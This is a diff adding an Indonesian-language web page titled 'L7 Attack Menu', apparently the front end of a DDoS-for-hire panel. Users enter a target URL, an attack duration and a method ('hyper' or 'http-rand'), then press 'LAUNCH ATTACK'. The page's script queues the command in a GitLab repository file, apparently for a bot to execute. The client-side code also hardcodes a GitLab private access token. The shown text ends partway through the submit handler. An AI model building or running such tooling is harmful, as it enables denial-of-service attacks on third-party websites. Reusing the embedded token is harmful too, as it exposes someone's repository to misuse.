@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW | L7 Menu</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;550;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- 1. THEME VARIABLES (DISALIN DARI TOOLS.HTML) --- */
+        body[data-theme="elegant-dark"] {
+            --bg-color: #000000; --text-color: #e0e0e0;
+            --primary-color: #cccccc; --primary-glow: rgba(204, 204, 204, 0.3); 
+            --border-color: #333; --input-bg: #1a1a1a;
+            --container-bg: #000000; --menu-card-bg: #0a0a0a;
+            --menu-card-bg-hover: #1a1a1a; --results-bg: #0a0a0a;
+            --results-border: var(--primary-color);
+            --danger-color: #ef4444; --success-color: #22c55e;
+            --gray-color: #64748b;
+        }
+        body[data-theme="midnight-blue"] {
+            --bg-color: #020617; --text-color: #e2e8f0;
+            --primary-color: #38bdf8; --primary-glow: rgba(56, 189, 248, 0.3); 
+            --border-color: #1e293b; --input-bg: #1e293b;
+            --container-bg: #020617; --menu-card-bg: #0f172a;
+            --menu-card-bg-hover: #1e293b; --results-bg: #0f172a;
+            --results-border: var(--primary-color);
+            --danger-color: #ef4444; --success-color: #22c55e;
+            --gray-color: #64748b;
+        }
+        body[data-theme="light-mode"] {
+            --bg-color: #f1f5f9; --text-color: #0f172a;
+            --primary-color: #0f172a; --primary-glow: rgba(15, 23, 42, 0.2); 
+            --border-color: #cbd5e1; --input-bg: #ffffff;
+            --container-bg: #f1f5f9; --menu-card-bg: #ffffff;
+            --menu-card-bg-hover: #e2e8f0; --results-bg: #ffffff;
+            --results-border: var(--primary-color);
+            --danger-color: #dc2626; --success-color: #16a34a;
+            --gray-color: #475569;
+        }
+
+        /* --- 2. GLOBAL STYLES (DISALIN DARI TOOLS.HTML) --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color); color: var(--text-color);
+            display: flex; justify-content: center; min-height: 100vh;
+            overflow-x: hidden; flex-direction: column; padding: 0;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+        
+        /* --- 3. LAYOUT & HEADER (DISALIN DARI TOOLS.HTML) --- */
+        .video-header-container {
+            position: relative; width: 100%; padding-top: 56.25%;
+            overflow: hidden; background-color: #111;
+            transition: height 0.3s ease, padding-top 0.3s ease;
+        }
+        body.hide-video .video-header-container { height: 0; padding-top: 0; }
+        
+        .video-header-container video {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%; object-fit: cover;
+        }
+        .video-overlay {
+            position: absolute; bottom: 0; left: 0; width: 100%;
+            padding: 2.5rem 1.5rem 1rem 1.5rem;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), rgba(0,0,0,0)); 
+            z-index: 2; transition: opacity 0.3s ease;
+        }
+        body.hide-overlay .video-overlay { opacity: 0; }
+        
+        .video-overlay p {
+            font-size: 0.9rem; color: #cccccc; font-weight: 500;
+            text-shadow: 0 0 5px rgba(0,0,0,0.5);
+            max-width: 70%;
+        }
+        
+        .video-overlay-right {
+            position: absolute;
+            bottom: 1rem; right: 1.5rem; z-index: 3;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.1rem; font-weight: 700; color: #fff;
+            text-shadow: 0 0 5px rgba(0,0,0,0.8);
+            transition: opacity 0.3s ease;
+        }
+        body.hide-overlay .video-overlay-right { opacity: 0; }
+        
+        #settings-toggle-btn {
+            position: fixed; top: 1rem; right: 1rem; z-index: 101;
+            background: rgba(0,0,0,0.5); backdrop-filter: blur(5px);
+            border: 1px solid var(--border-color); color: var(--primary-color);
+            width: 40px; height: 40px; border-radius: 5px;
+            font-size: 1.1rem; cursor: pointer; transition: all 0.3s ease;
+        }
+        #settings-toggle-btn:hover { background: var(--primary-color); color: var(--bg-color); }
+        
+        .container {
+            width: 100%; max-width: 100%;
+            background-color: var(--container-bg); 
+            padding: 1.5rem; z-index: 10; margin-top: 0;
+            border-radius: 0; border: none; box-shadow: none; 
+            min-height: 100vh; transition: background-color 0.3s ease;
+        }
+
+        @media (min-width: 768px) {
+            body { align-items: center; }
+            .container {
+                width: 100%; max-width: 900px; margin: 2rem auto;
+                border-radius: 8px; border: 1px solid var(--border-color);
+                box-shadow: 0 0 25px rgba(0, 0, 0, 0.8);
+                min-height: auto; overflow: hidden;
+            }
+        }
+
+        h2 {
+            font-size: 2rem; text-align: center; margin-bottom: 2rem;
+            font-weight: 700; color: var(--primary-color); margin-top: 1.5rem;
+        }
+        h3 {
+             font-size: 1.5rem; color: var(--primary-color);
+             border-bottom: 1px solid var(--border-color);
+             padding-bottom: 5px; margin-bottom: 1.5rem;
+        }
+        p.tool-description {
+            color: var(--text-color); opacity: 0.7; font-size: 0.9rem; 
+            margin-bottom: 1.5rem; text-align: center;
+        }
+        
+        /* --- 4. FORM & BUTTONS (DISALIN DARI TOOLS.HTML) --- */
+        .form-group { margin-bottom: 1.5rem; position: relative; }
+        label, .form-label { display: block; margin-bottom: 0.75rem; font-weight: 500; color: var(--text-color); opacity: 0.9; }
+        .form-control-container { position: relative; }
+        
+        input.form-control,
+        textarea.form-control {
+            width: 100%; padding: 1rem 1rem 1rem 3rem; font-size: 1rem;
+            border-radius: 5px; border: 1px solid var(--border-color);
+            background-color: var(--input-bg); color: var(--text-color);
+            transition: all 0.3s ease; font-family: 'Poppins', sans-serif;
+        }
+        
+        .input-icon {
+            position: absolute; top: 50%; left: 1rem;
+            transform: translateY(-50%); color: var(--gray-color);
+            font-size: 1.1rem; transition: all 0.3s ease; z-index: 2;
+        }
+        
+        input.form-control:focus + .input-icon,
+        textarea.form-control:focus + .input-icon {
+            color: var(--primary-color);
+        }
+
+        input.form-control:focus, 
+        textarea.form-control:focus {
+            outline: none; border-color: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-glow); 
+        }
+
+        button {
+            width: 100%; padding: 0.9rem; font-size: 1rem;
+            border-radius: 5px; background-color: var(--primary-color);
+            color: var(--bg-color); border: 2px solid var(--primary-color);
+            font-weight: 600; cursor: pointer; text-transform: uppercase;
+            letter-spacing: 1px; transition: all 0.3s ease;
+        }
+        button:hover:not(:disabled) {
+            background-color: transparent; color: var(--primary-color);
+            box-shadow: 0 0 15px var(--primary-glow); 
+            transform: translateY(-2px);
+        }
+        button:disabled { background-color: #222; color: #555; border-color: #222; cursor: not-allowed; }
+        button.secondary { 
+            background: transparent; border: 1px solid var(--border-color); 
+            color: var(--text-color); opacity: 0.7; font-weight: 500; 
+        }
+        button.secondary:hover:not(:disabled) { 
+            background-color: transparent; color: var(--primary-color); 
+            border-color: var(--primary-color); opacity: 1;
+            box-shadow: none; transform: none; 
+        }
+        .back-button {
+            width: auto; padding: 0.5rem 1rem; font-size: 0.9rem;
+            text-transform: none; margin-bottom: 1.5rem; border-width: 1px;
+            display: inline-block; text-decoration: none;
+        }
+        
+        .toggle-switch {
+            display: flex; align-items: center; justify-content: space-between;
+            background: var(--input-bg); padding: 0.8rem 1rem;
+            border-radius: 5px; border: 1px solid var(--border-color);
+            margin-bottom: 0.5rem;
+        }
+        .toggle-switch label { margin: 0; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #555; transition: .4s; border-radius: 24px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--primary-color); }
+        input:checked + .slider:before { transform: translateX(26px); }
+
+        /* --- 5. NOTIFICATION (DISALIN DARI TOOLS.HTML) --- */
+        .notification { text-align: center; padding: 0.8rem; margin: 1rem 0; border-radius: 5px; display: none; font-size: 0.9rem; border: 1px solid; }
+        .notification.success { background-color: #0f3d1b; color: #8affab; border-color: #1a7431; }
+        .notification.error { background-color: #3d0f0f; color: #ffa8a8; border-color: #741a1a; }
+        .notification.info { background-color: #0f2a3d; color: #a8dfff; border-color: #1a5674; }
+        
+        /* --- 6. MENU & FOOTER (DISALIN DARI TOOLS.HTML) --- */
+        .menu-card {
+            display: flex; align-items: center;
+            background-color: var(--menu-card-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-color); padding: 1.5rem;
+            border-radius: 8px; text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        .menu-card:hover {
+            background-color: var(--menu-card-bg-hover);
+            border-color: var(--primary-color);
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            color: var(--primary-color);
+        }
+        .menu-card i {
+            font-size: 1.5rem; color: var(--primary-color);
+            width: 40px; text-align: center; margin-right: 1.5rem;
+        }
+        .menu-card span { font-size: 1.1rem; font-weight: 500; }
+        
+        .dev-footer { text-align: center; border-top: 1px solid var(--border-color); padding-top: 2rem; margin-top: 2.5rem; }
+        .dev-footer p { opacity: 0.7; font-size: 0.9rem; margin-bottom: 1.5rem; max-width: 600px; margin-left: auto; margin-right: auto; }
+        
+        /* --- 7. SETTINGS PANEL (DISALIN DARI TOOLS.HTML) --- */
+        #settings-panel {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); backdrop-filter: blur(5px);
+            z-index: 100; display: flex; justify-content: center; align-items: center;
+            opacity: 0; visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        #settings-panel.active { opacity: 1; visibility: visible; }
+        .settings-box {
+            background: var(--menu-card-bg); padding: 2rem; border-radius: 8px;
+            border: 1px solid var(--border-color); box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 90%; max-width: 400px; position: relative;
+            transform: translateX(50px); opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.23, 1, 0.32, 1), opacity 0.3s ease;
+        }
+        #settings-panel.active .settings-box { transform: translateX(0); opacity: 1; }
+        .settings-box h3 { text-align: center; margin-top: 0; margin-bottom: 1.5rem; }
+        .theme-switcher { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; }
+        .theme-switcher button { text-transform: none; font-size: 0.9rem; padding: 0.8rem 0.5rem; font-weight: 500; }
+        #close-settings-btn {
+            position: absolute; top: 1rem; right: 1rem;
+            width: 30px; height: 30px; padding: 0;
+            font-size: 1rem; border-radius: 50%;
+        }
+        .settings-options { margin-top: 1.5rem; display: flex; flex-direction: column; gap: 0.5rem; }
+        
+        /* --- 8. STYLE CUSTOM SELECT DROPDOWN (DISALIN DARI UNBAND.HTML) --- */
+        .custom-select {
+            position: relative;
+        }
+        .select-selected {
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 1rem 3rem 1rem 3rem; /* Pad left untuk icon, pad right untuk panah */
+            font-size: 1rem;
+            color: var(--text-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            user-select: none;
+        }
+        .select-selected:hover {
+            border-color: var(--primary-color);
+        }
+        .select-selected.select-arrow-active {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-glow); 
+        }
+        .select-selected::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            right: 1.25rem;
+            transform: translateY(-50%);
+            width: 0;
+            height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 6px solid var(--gray-color);
+            transition: all 0.3s ease;
+        }
+        .select-selected.select-arrow-active::after {
+            transform: translateY(-50%) rotate(180deg);
+            border-top-color: var(--primary-color);
+        }
+        .select-items {
+            position: absolute;
+            background-color: var(--menu-card-bg);
+            top: calc(100% + 4px);
+            left: 0;
+            right: 0;
+            z-index: 99;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            max-height: 250px;
+            overflow-y: auto;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+        }
+        .select-hide {
+            display: none;
+        }
+        .select-items div {
+            color: var(--text-color);
+            padding: 0.9rem 1.2rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .select-items div:last-child {
+            border-bottom: none;
+        }
+        .select-items div:hover {
+            background-color: var(--menu-card-bg-hover);
+            color: var(--primary-color);
+        }
+        .same-as-selected {
+            background-color: var(--input-bg);
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body data-theme="elegant-dark">
+
+    <button id="settings-toggle-btn" title="Pengaturan">
+        <i class="fas fa-swatchbook"></i>
+    </button>
+    
+    <div class="container">
+        
+        <div class="video-header-container">
+            <video autoplay muted loop playsinline src="https://files.catbox.moe/w6a76y.mp4">
+                Browser Anda tidak mendukung tag video.
+            </video>
+            <div class="video-overlay">
+                <p>Created & Developed by SHADOW</p>
+            </div>
+            <div class="video-overlay-right" id="live-clock">
+                --:--:--
+            </div>
+        </div>
+        
+        <a href="index.html" class="back-button secondary"><i class="fas fa-chevron-left"></i> Kembali ke Lobby</a>
+        
+        <h2><i class="fas fa-network-wired"></i> L7 Attack Menu</h2>
+
+        <div id="l7-panel">
+            <h3><i class="fas fa-server"></i> Konfigurasi Serangan</h3>
+            <p class="tool-description">Masukkan detail target untuk memulai serangan L7.</p>
+            
+            <form id="l7-form">
+                <div id="l7-notification" class="notification"></div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="l7-url">Target URL</label>
+                    <div class="form-control-container">
+                        <i class="fas fa-globe input-icon"></i>
+                        <input type="text" id="l7-url" class="form-control" placeholder="https://target-website.com" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="l7-time">Durasi (Detik)</label>
+                    <div class="form-control-container">
+                        <i class="fas fa-clock input-icon"></i>
+                        <input type="number" id="l7-time" class="form-control" placeholder="60" inputmode="numeric" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="l7-metode-value">Metode Serangan</label>
+                    <div class="form-control-container">
+                        <i class="fas fa-bolt input-icon"></i>
+                        <div class="custom-select" id="custom-select-metode">
+                            <input type="hidden" id="l7-metode-value" value="hyper">
+                            
+                            <div class="select-selected">
+                                L7 - Hyper
+                            </div>
+                            
+                            <div class="select-items select-hide">
+                                <div data-value="hyper" class="same-as-selected">L7 - Hyper</div>
+                                <div data-value="http-rand">L7 - HTTP-RAND</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="l7-nomor">Nomor HP (Untuk Log)</label>
+                    <div class="form-control-container">
+                        <i class="fas fa-user-secret input-icon"></i>
+                        <input type="tel" id="l7-nomor" class="form-control" placeholder="628xxxx (Wajib untuk log)" inputmode="tel" required>
+                    </div>
+                </div>
+                
+                <button type="submit" id="l7-execute-btn" style="background: var(--danger-color); border-color: var(--danger-color); font-weight: bold;">
+                    <i class="fas fa-exclamation-triangle"></i> LAUNCH ATTACK
+                </button>
+            </form>
+        </div>
+        
+        <div class="dev-footer" style="margin-top: 3rem;">
+            <h3><i class="fas fa-code"></i> Developer Info</h3>
+            <p style="opacity: 0.7; font-size: 0.9rem; margin-bottom: 1.5rem; max-width: 600px; margin-left: auto; margin-right: auto;">
+                Dibuat & Dikembangkan oleh SHADOW. <br>
+                Jika menemukan error atau bug, jangan ragu untuk melapor.
+            </p>
+            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
+                <a href="https://t.me/WahyzMaybe" target="_blank" class="menu-card" style="width: auto; padding: 0.8rem 1.2rem; text-decoration: none; flex: 1; min-width: 150px; margin-bottom: 0;">
+                    <i class="fab fa-whatsapp"></i>
+                    <span>Lapor Bug (WA)</span>
+                </a>
+            </div>
+        </div>
+        
+    </div>
+    
+    <div id="settings-panel">
+        <div class="settings-box">
+            <button id="close-settings-btn" class="secondary"><i class="fas fa-times"></i></button>
+            <h3><i class="fas fa-swatchbook"></i> Ganti Tema</h3>
+            <div class="theme-switcher">
+                <button data-theme="elegant-dark">Elegant Dark</button>
+                <button data-theme="midnight-blue">Midnight Blue</button>
+                <button data-theme="light-mode">Light Mode</button>
+            </div>
+            <h3 style="margin-top: 2rem;"><i class="fas fa-cog"></i> Opsi Tampilan</h3>
+            <div class="settings-options">
+                <div class="toggle-switch">
+                    <label for="toggle-video">Video Header</label>
+                    <label class="switch">
+                        <input type="checkbox" id="toggle-video">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="toggle-switch">
+                    <label for="toggle-overlay">Info Overlay Video</label>
+                    <label class="switch">
+                        <input type="checkbox" id="toggle-overlay">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <button id="reset-settings-btn" class="secondary" style="margin-top: 1rem;">Reset Pengaturan</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- (BARU) KONFIGURASI GITLAB (Salin dari index.html) ---
+        // -----------------------------------------------------------------
+        const GITLAB_TOKEN = 'glpat-9cZaOPR0hBHj-qiqIqzT9W86MQp1Omlsc2xiCw.01.120onr34s';
+        const GITLAB_PROJECT_ID = '75681438';
+        const GITLAB_BRANCH = 'main';
+        // -----------------------------------------------------------------
+        
+        const COMMAND_FILE = 'cmd.json';
+        const USERS_FILE = 'users.json'; // Diperlukan untuk cek login
+        
+        const GITLAB_BASE_URL = `https://gitlab.com/api/v4/projects/${GITLAB_PROJECT_ID}/repository/files/`;
+        const GITLAB_CMD_URL = `${GITLAB_BASE_URL}${encodeURIComponent(COMMAND_FILE)}`;
+        const GITLAB_USERS_URL = `${GITLAB_BASE_URL}${encodeURIComponent(USERS_FILE)}`;
+
+        let USER_INFO = null;
+        // --- (BARU) AKHIR KONFIGURASI GITLAB ---
+
+
+        /* --- 1. HELPER FUNCTIONS (NOTIF, BUTTONS) --- */
+        function showNotification(id, message, type) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.textContent = message;
+            el.className = 'notification ' + type;
+            el.style.display = 'block';
+        }
+
+        function disableButton(btn) {
+            if (!btn) return;
+            btn.disabled = true;
+            btn.setAttribute('data-original-text', btn.innerHTML);
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
+        }
+
+        function enableButton(btn) {
+            if (!btn) return;
+            btn.disabled = false;
+            const originalText = btn.getAttribute('data-original-text');
+            if (originalText) { btn.innerHTML = originalText; }
+        }
+
+        // --- (BARU) HELPER TAMBAHAN (Salin dari index.html) ---
+        function generateUniqueId() {
+            return Math.random().toString(36).substring(2, 10);
+        }
+
+        // --- (BARU) FUNGSI API GITLAB (Salin dari index.html) ---
+        async function getGitLabFile(fileUrl) {
+            if (GITLAB_TOKEN === 'YOUR_GITLAB_PRIVATE_TOKEN_HERE' || GITLAB_PROJECT_ID === '12345678') {
+                alert("FATAL ERROR: GITLAB_TOKEN atau GITLAB_PROJECT_ID belum diatur! Silakan edit file HTML dan masukkan kredensial Anda.");
+                throw new Error("Token Gagal: Token/Project ID belum diatur.");
+            }
+            
+            try {
+                const response = await fetch(`${fileUrl}?ref=${GITLAB_BRANCH}`, {
+                    method: 'GET', 
+                    headers: { 
+                        'Private-Token': GITLAB_TOKEN,
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.status === 401 || response.status === 403) {
+                     alert(`[STATUS ${response.status}] Token/Izin GitLab Gagal. Cek token (scope 'api') dan Project ID Anda.`);
+                     throw new Error(`Token Gagal: ${response.status}`);
+                }
+                
+                if (response.status === 404) {
+                    return { data: null, lastCommitId: null };
+                }
+                
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                
+                const data = await response.json();
+                const fileName = decodeURIComponent(fileUrl.split('/').pop().split('?')[0]); 
+                let content;
+                
+                if (!data.content) {
+                    if (fileName === USERS_FILE) {
+                        content = { settings: { maintenance: false, maintenanceMsg: "" }, users: [] };
+                    } else if (fileName === COMMAND_FILE) {
+                        content = [];
+                    } else {
+                        content = {};
+                    }
+                } else {
+                     let decodedContent = "";
+                     try {
+                         decodedContent = atob(data.content);
+                         content = JSON.parse(decodedContent);
+                     } catch (e) {
+                         console.error(`Gagal parse JSON dari file: ${fileName}. Isi file mentah:`, decodedContent);
+                         throw new Error(`File '${fileName}' di server korup atau bukan JSON. (Error: ${e.message})`);
+                     }
+                }
+                
+                return { data: content, lastCommitId: data.last_commit_id };
+
+            } catch (error) {
+                console.error("Failed to fetch GitLab file:", error);
+                const errorMsg = error.message.includes('Failed to fetch') 
+                               ? 'Koneksi Jaringan Gagal.' 
+                               : error.message;
+                if (!error.message.includes('Token Gagal') && !error.message.includes('korup')) {
+                   alert(`[ERROR FETCH] ${errorMsg}`);
+                }
+                throw new Error(errorMsg);
+            }
+        }
+
+        async function updateGitLabFile(fileUrl, commitMessage, dataObject, lastCommitId, btn) {
+            if (btn) disableButton(btn);
+            let errorOccurred = null;
+            
+            try {
+                const content = btoa(unescape(encodeURIComponent(JSON.stringify(dataObject, null, 2)))); 
+                const method = lastCommitId ? 'PUT' : 'POST';
+
+                const payload = {
+                    branch: GITLAB_BRANCH,
+                    commit_message: commitMessage,
+                    content: content,
+                    encoding: 'base64'
+                };
+
+                const response = await fetch(fileUrl, {
+                    method: method,
+                    headers: {
+                        'Private-Token': GITLAB_TOKEN,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.status === 401 || response.status === 403) {
+                     alert(`[STATUS ${response.status}] FATAL UPDATE ERROR: Token Gagal.`);
+                     throw new Error(`Token Gagal: ${response.status}`);
+                }
+                
+                if (response.status === 400) { 
+                    const errData = await response.json();
+                    let errMsg = errData.message || 'Error 400 Bad Request';
+                    
+                    if (method === 'POST' && errMsg.includes('already exists')) {
+                        console.warn('File sudah ada, mencoba update (PUT) ulang...');
+                        const { lastCommitId: newCommitId } = await getGitLabFile(fileUrl);
+                        return await updateGitLabFile(fileUrl, commitMessage, dataObject, newCommitId, btn);
+                    }
+                    
+                    alert(`[ERROR 400] Gagal update file: ${errMsg}. Coba refresh.`);
+                    throw new Error(`GitLab Update Error: ${errMsg}`);
+                }
+
+                if (response.status === 409) {
+                    alert(`[ERROR 409] Terjadi konflik saat update file. Coba refresh dan ulangi.`);
+                     throw new Error(`GitLab Update Conflict: ${response.status}`);
+                }
+
+                if (!response.ok) throw new Error(`GitLab Update Failed! Status: ${response.status}`);
+                
+                return true;
+            } catch (error) {
+                console.error("Failed to update GitLab file:", error);
+                errorOccurred = error;
+                if (!error.message.includes('GitLab Update Error') && !error.message.includes('Token Gagal')) {
+                   alert(`[ERROR FATAL UPDATE] ${error.message}`);
+                }
+                throw error;
+            } finally {
+                if (btn && (!errorOccurred || !errorOccurred.message.includes('Conflict'))) {
+                   enableButton(btn);
+                }
+            }
+        }
+        // --- (BARU) AKHIR FUNGSI API GITLAB ---
+
+        /* --- 2. LOGIKA TEMA, SETTINGS, VIDEO, JAM (SAMA SEPERTI TOOLS.HTML) --- */
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // --- (BARU) PENGECEKAN LOGIN ---
+            const userString = localStorage.getItem('user');
+            if (!userString) {
+                alert('Anda belum login. Silakan login terlebih dahulu.');
+                window.location.href = 'index.html'; // Arahkan kembali ke index/login
+                return; // Hentikan eksekusi
+            }
+            USER_INFO = JSON.parse(userString);
+            // --- (BARU) AKHIR PENGECEKAN LOGIN ---
+
+            const settingsPanel = document.getElementById('settings-panel');
+            const settingsToggleBtn = document.getElementById('settings-toggle-btn');
+            const closeSettingsBtn = document.getElementById('close-settings-btn');
+            
+            function openSettings() { settingsPanel.classList.add('active'); }
+            function closeSettings() { settingsPanel.classList.remove('active'); }
+            
+            settingsToggleBtn.addEventListener('click', openSettings);
+            closeSettingsBtn.addEventListener('click', closeSettings);
+            settingsPanel.addEventListener('click', (e) => {
+                if (e.target === settingsPanel) { closeSettings(); }
+            });
+            
+            const themeSwitcher = document.querySelector('.theme-switcher');
+            themeSwitcher.addEventListener('click', (e) => {
+                if (e.target.tagName === 'BUTTON') {
+                    const theme = e.target.dataset.theme;
+                    document.body.dataset.theme = theme;
+                    localStorage.setItem('xvct-theme', theme);
+                    closeSettings();
+                }
+            });
+            
+            const toggleVideo = document.getElementById('toggle-video');
+            const toggleOverlay = document.getElementById('toggle-overlay');
+            const resetSettingsBtn = document.getElementById('reset-settings-btn');
+            function applySettings() {
+                const hideVideo = localStorage.getItem('xvct-hide-video') === 'true';
+                const hideOverlay = localStorage.getItem('xvct-hide-overlay') === 'true';
+                toggleVideo.checked = hideVideo;
+                toggleOverlay.checked = hideOverlay;
+                document.body.classList.toggle('hide-video', hideVideo);
+                document.body.classList.toggle('hide-overlay', hideOverlay);
+            }
+            function loadThemeAndSettings() {
+                const savedTheme = localStorage.getItem('xvct-theme');
+                if (savedTheme) { document.body.dataset.theme = savedTheme; }
+                applySettings();
+            }
+            toggleVideo.addEventListener('change', () => {
+                localStorage.setItem('xvct-hide-video', toggleVideo.checked);
+                applySettings();
+            });
+            toggleOverlay.addEventListener('change', () => {
+                localStorage.setItem('xvct-hide-overlay', toggleOverlay.checked);
+                applySettings();
+            });
+            resetSettingsBtn.addEventListener('click', () => {
+                localStorage.removeItem('xvct-theme');
+                localStorage.removeItem('xvct-hide-video');
+                localStorage.removeItem('xvct-hide-overlay');
+                document.body.dataset.theme = 'elegant-dark';
+                applySettings();
+                loadThemeAndSettings();
+                closeSettings();
+            });
+            loadThemeAndSettings();
+
+            const clockEl = document.getElementById('live-clock');
+            function updateTime() {
+                if (!clockEl) return;
+                const d = new Date(new Date().getTime() + 7*3600000); 
+                const h = d.getUTCHours().toString().padStart(2, '0');
+                const m = d.getUTCMinutes().toString().padStart(2, '0');
+                const s = d.getUTCSeconds().toString().padStart(2, '0');
+                clockEl.textContent = `${h}:${m}:${s}`;
+            }
+            updateTime();
+            setInterval(updateTime, 1000);
+
+            /* --- 3. LOGIKA CUSTOM SELECT DROPDOWN (DISALIN DARI UNBAND.HTML) --- */
+            (function() {
+                const customSelect = document.getElementById('custom-select-metode');
+                if (!customSelect) return;
+                
+                const selEl = customSelect.querySelector('.select-selected');
+                const itemsEl = customSelect.querySelector('.select-items');
+                const options = itemsEl.querySelectorAll('div');
+                const hiddenInput = customSelect.querySelector('#l7-metode-value');
+
+                // Toggle buka/tutup
+                selEl.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    itemsEl.classList.toggle('select-hide');
+                    selEl.classList.toggle('select-arrow-active');
+                });
+
+                // Pilih opsi
+                options.forEach(opt => {
+                    opt.addEventListener('click', function() {
+                        selEl.innerHTML = this.innerHTML; // Update teks tombol
+                        hiddenInput.value = this.dataset.value; // Update value di input tersembunyi
+                        
+                        options.forEach(o => o.classList.remove('same-as-selected'));
+                        this.classList.add('same-as-selected');
+                        
+                        itemsEl.classList.add('select-hide');
+                        selEl.classList.remove('select-arrow-active');
+                    });
+                });
+
+                // Klik di luar untuk menutup
+                document.addEventListener('click', function() {
+                    itemsEl.classList.add('select-hide');
+                    selEl.classList.remove('select-arrow-active');
+                });
+            })();
+
+            /* --- 4. (BARU) LOGIKA PENGIRIMAN L7 --- */
+            // Menggantikan blok simulasi sebelumnya
+            
+            const l7Form = document.getElementById('l7-form');
+            const l7ExecuteBtn = document.getElementById('l7-execute-btn');
+
+            if (l7Form) {
+                l7Form.addEventListener('submit', async (e) => { // Tambahkan async
+                    e.preventDefault();
+                    
+                    const url = document.getElementById('l7-url').value;
+                    const time = document.getElementById('l7-time').value;
+                    const nomor = document.getElementById('l7-nomor').value;
+                    const metode = document.getElementById('l7-metode-value').value; // 'hyper' or 'http-rand'
+                    const notifEl = document.getElementById('l7-notification');
+
+                    if (!url || !time || !nomor || !metode) {
+                        showNotification('l7-notification', 'Semua field wajib diisi!', 'error');
+                        return;
+                    }
+                    
+                    // Format data (mirip handleExecute)
+                    const phone = nomor.startsWith('62') ? nomor : `62${nomor.substring(1)}`;
+                    const selectCommand = `.${metode}`; // Tambahkan '.' -> '.hyper' or '.http-rand'
+                    const commandToSend = `${selectCommand} ${url} ${time}`;
+
+                    // Menonaktifkan tombol
+                    disableButton(l7ExecuteBtn);
+                    showNotification('l7-notification', `Mempersiapkan serangan ${metode.toUpperCase()}...`, 'info');
+
+                    // --- INI LOGIKA ASLI GITLAB (Menggantikan simulasi) ---
+                    try {
+                        const { data: allCommands = [], lastCommitId } = await getGitLabFile(GITLAB_CMD_URL);
+                        
+                        const existing = allCommands.find(cmd => 
+                            cmd.phone === phone && 
+                            cmd.command === commandToSend && 
+                            cmd.status === 'NEW'
+                        );
+                        
+                        if (existing) {
+                            showNotification('l7-notification', `Perintah ${selectCommand} ke ${phone} sudah ada dalam antrian (ID: ${existing.id}). Harap tunggu.`, 'info');
+                            enableButton(l7ExecuteBtn); // Aktifkan kembali tombol jika duplikat
+                            return;
+                        }
+                        
+                        const newCommand = {
+                            id: generateUniqueId(),
+                            command: commandToSend,
+                            phone: phone,
+                            status: 'NEW',
+                            timestamp: new Date().toISOString(),
+                            requestedBy: USER_INFO.username // USER_INFO dari login check
+                        };
+
+                        allCommands.push(newCommand);
+                        const commitMessage = `WebCmd: '${selectCommand}' by ${USER_INFO.username}`;
+                        
+                        await updateGitLabFile(GITLAB_CMD_URL, commitMessage, allCommands, lastCommitId, l7ExecuteBtn);
+                        
+                        showNotification('l7-notification', `Serangan L7 (${metode.toUpperCase()}) berhasil dikirim ke server!`, 'success');
+                        
+                        // Reset form
+                        l7Form.reset();
